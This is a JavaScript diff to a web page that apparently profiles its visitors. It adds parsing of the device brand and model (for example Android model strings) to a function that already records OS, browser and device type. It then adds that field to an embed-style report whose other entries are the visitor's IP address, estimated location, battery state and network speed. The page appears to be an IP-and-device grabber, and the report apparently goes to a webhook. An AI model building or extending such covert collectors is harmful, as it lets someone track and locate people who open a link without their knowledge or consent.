@@ -60,6 +60,7 @@
             let browser = "Unknown Browser";
             let hardwareDetail = "Generic Device";
             let deviceType = "PC (Desktop/Laptop)";
+            let brandModel = "Generic/Custom PC";
 
             try {
                 const canvas = document.createElement('canvas');
@@ -77,19 +78,30 @@
                 console.error(e);
             }
 
-            if (/iPhone|iPod/i.test(ua)) {
+            // High-level brand/model checking via User Agent tokens
+            if (/iPhone/i.test(ua)) {
                 os = "Apple iOS (iPhone)";
                 deviceType = "Mobile Phone";
+                brandModel = "Apple iPhone";
+            } else if (/iPod/i.test(ua)) {
+                os = "Apple iOS (iPod)";
+                deviceType = "Mobile Phone";
+                brandModel = "Apple iPod Touch";
             } else if (/iPad/i.test(ua)) {
                 os = "Apple iOS (iPad)";
                 deviceType = "Tablet";
+                brandModel = "Apple iPad";
             } else if (/Android/i.test(ua)) {
                 const match = ua.match(/Android\s([0-9\.]+)/);
                 os = match ? `Android ${match[1]}` : "Android Device";
-                if (/Mobile/i.test(ua)) {
-                    deviceType = "Mobile Phone";
+                deviceType = /Mobile/i.test(ua) ? "Mobile Phone" : "Tablet";
+                
+                // Parse typical Android model strings from the UserAgent format: Android ...; MODEL Build/...
+                const modelMatch = ua.match(/Android[^;]*;\s*([^;)]*)\s*(?:Build|;\s*wv|\))/i);
+                if (modelMatch && modelMatch[1]) {
+                    brandModel = modelMatch[1].trim();
                 } else {
-                    deviceType = "Tablet";
+                    brandModel = "Generic Android Device";
                 }
             } else if (/Windows NT/i.test(ua)) {
                 if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
@@ -105,9 +117,11 @@
                 if (navigator.maxTouchPoints && navigator.maxTouchPoints > 2) {
                     os = "macOS (iPad Pro/Air)";
                     deviceType = "Tablet";
+                    brandModel = "Apple iPad (M-Series)";
                 } else {
                     os = "macOS (Apple Mac)";
                     deviceType = "PC (Desktop/Laptop)";
+                    brandModel = "Apple Mac";
                 }
             } else if (/Linux/i.test(ua)) {
                 os = "Linux System";
@@ -129,7 +143,7 @@
                 browser = "Mozilla Firefox";
             }
 
-            return { os, browser, hardwareDetail, deviceType };
+            return { os, browser, hardwareDetail, deviceType, brandModel };
         }
 
         async function getBatteryDetails() {
@@ -202,6 +216,7 @@
                             { name: "🌐 IP Address", value: ipAddress, inline: true },
                             { name: "📍 Estimated Location", value: locationData, inline: true },
                             { name: "🖥️ Device Type", value: cleanDevice.deviceType, inline: true },
+                            { name: "🏷️ Brand/Model Name", value: cleanDevice.brandModel, inline: true },
                             { name: "🔋 Battery Level", value: batteryInfo.level, inline: true },
                             { name: "🔌 Is Charging?", value: batteryInfo.charging, inline: true },
                             { name: "⚡ Network Speed", value: netSpeed, inline: true },
